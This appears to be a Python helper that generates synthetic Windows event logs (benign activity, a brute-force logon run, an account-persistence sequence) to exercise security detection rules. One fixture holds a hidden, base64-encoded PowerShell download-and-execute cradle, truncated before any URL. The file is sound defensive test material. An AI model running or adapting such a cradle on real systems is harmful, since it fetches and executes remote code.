#!/usr/bin/env python3
"""Generates the three sample log files under sample_logs/.

These are synthetic events built to exercise every detection rule at least
once (and, in normal_activity.jsonl, to exercise the *absence* of a
detection on benign-but-similar-looking activity). Nothing here comes from
a real environment - it's representative Windows Security/Sysmon event
shapes with made-up hosts, accounts, and IPs.
"""
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT_DIR = Path(__file__).resolve().parent.parent / "sample_logs"
OUT_DIR.mkdir(exist_ok=True)


def w(events, name):
    path = OUT_DIR / name
    with path.open("w", encoding="utf-8") as fh:
        for e in events:
            fh.write(json.dumps(e) + "\n")
    print(f"wrote {len(events)} events -> {path}")


def t(base, **delta):
    return (base + timedelta(**delta)).isoformat().replace("+00:00", "Z")


# ---------------------------------------------------------------------------
# normal_activity.jsonl - a quiet morning. Should produce ZERO findings.
# ---------------------------------------------------------------------------
base = datetime(2026, 8, 18, 8, 0, 0, tzinfo=timezone.utc)
normal = [
    {"event_id": 4624, "timestamp": t(base, minutes=0), "host": "WIN-DC01", "account_name": "jsmith",
     "source_ip": "10.1.4.22", "logon_type": 3, "status": "success"},
    {"event_id": 4688, "timestamp": t(base, minutes=1), "host": "WIN-DC01", "account_name": "jsmith",
     "process_name": "outlook.exe", "command_line": "outlook.exe"},
    {"event_id": 4624, "timestamp": t(base, minutes=5), "host": "WIN-WKS14", "account_name": "mrivera",
     "source_ip": "10.1.4.55", "logon_type": 2, "status": "success"},
    {"event_id": 4625, "timestamp": t(base, minutes=6), "host": "WIN-WKS14", "account_name": "mrivera",
     "source_ip": "10.1.4.55", "logon_type": 2, "status": "failure"},
    {"event_id": 4624, "timestamp": t(base, minutes=6, seconds=20), "host": "WIN-WKS14", "account_name": "mrivera",
     "source_ip": "10.1.4.55", "logon_type": 2, "status": "success"},
    {"event_id": 4688, "timestamp": t(base, minutes=7), "host": "WIN-WKS14", "account_name": "mrivera",
     "process_name": "explorer.exe", "command_line": "explorer.exe"},
    {"event_id": 4624, "timestamp": t(base, minutes=10), "host": "WIN-SVR03", "account_name": "svc_backup_job",
     "source_ip": "10.1.1.5", "logon_type": 5, "status": "success"},
    {"event_id": 4672, "timestamp": t(base, minutes=10, seconds=5), "host": "WIN-SVR03", "account_name": "svc_backup_job"},
    {"event_id": 4720, "timestamp": t(base, minutes=15), "host": "WIN-DC01", "account_name": "helpdesk_admin",
     "target_account": "kwong"},
    {"event_id": 4732, "timestamp": t(base, hours=2, minutes=15), "host": "WIN-DC01", "account_name": "helpdesk_admin",
     "target_account": "kwong", "target_group": "HelpDesk-L1"},
]
w(normal, "normal_activity.jsonl")

base = datetime(2026, 8, 20, 2, 10, 0, tzinfo=timezone.utc)
attacker_ip = "45.33.12.7"
brute = []
for i in range(7):
    brute.append({
        "event_id": 4625, "timestamp": t(base, minutes=i), "host": "WIN-VPN01",
        "account_name": "svc_backup", "source_ip": attacker_ip, "logon_type": 10, "status": "failure",
    })
brute.append({
    "event_id": 4624, "timestamp": t(base, minutes=8), "host": "WIN-VPN01",
    "account_name": "svc_backup", "source_ip": attacker_ip, "logon_type": 10, "status": "success",
})
brute.append({
    "event_id": 4672, "timestamp": t(base, minutes=8, seconds=15), "host": "WIN-VPN01",
    "account_name": "svc_backup",
})
w(brute, "brute_force_attack.jsonl")

base = datetime(2026, 8, 22, 23, 40, 0, tzinfo=timezone.utc)
persistence = [
    {"event_id": 4720, "timestamp": t(base, minutes=0), "host": "WIN-DC01",
     "account_name": "svc_backup", "target_account": "temp_admin"},
    {"event_id": 4732, "timestamp": t(base, minutes=3), "host": "WIN-DC01",
     "account_name": "svc_backup", "target_account": "temp_admin", "target_group": "Domain Admins"},
    {"event_id": 4688, "timestamp": t(base, minutes=4), "host": "WIN-DC01", "account_name": "temp_admin",
     "process_name": "powershell.exe",
     "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA"},
]
w(persistence, "persistence_attack.jsonl")
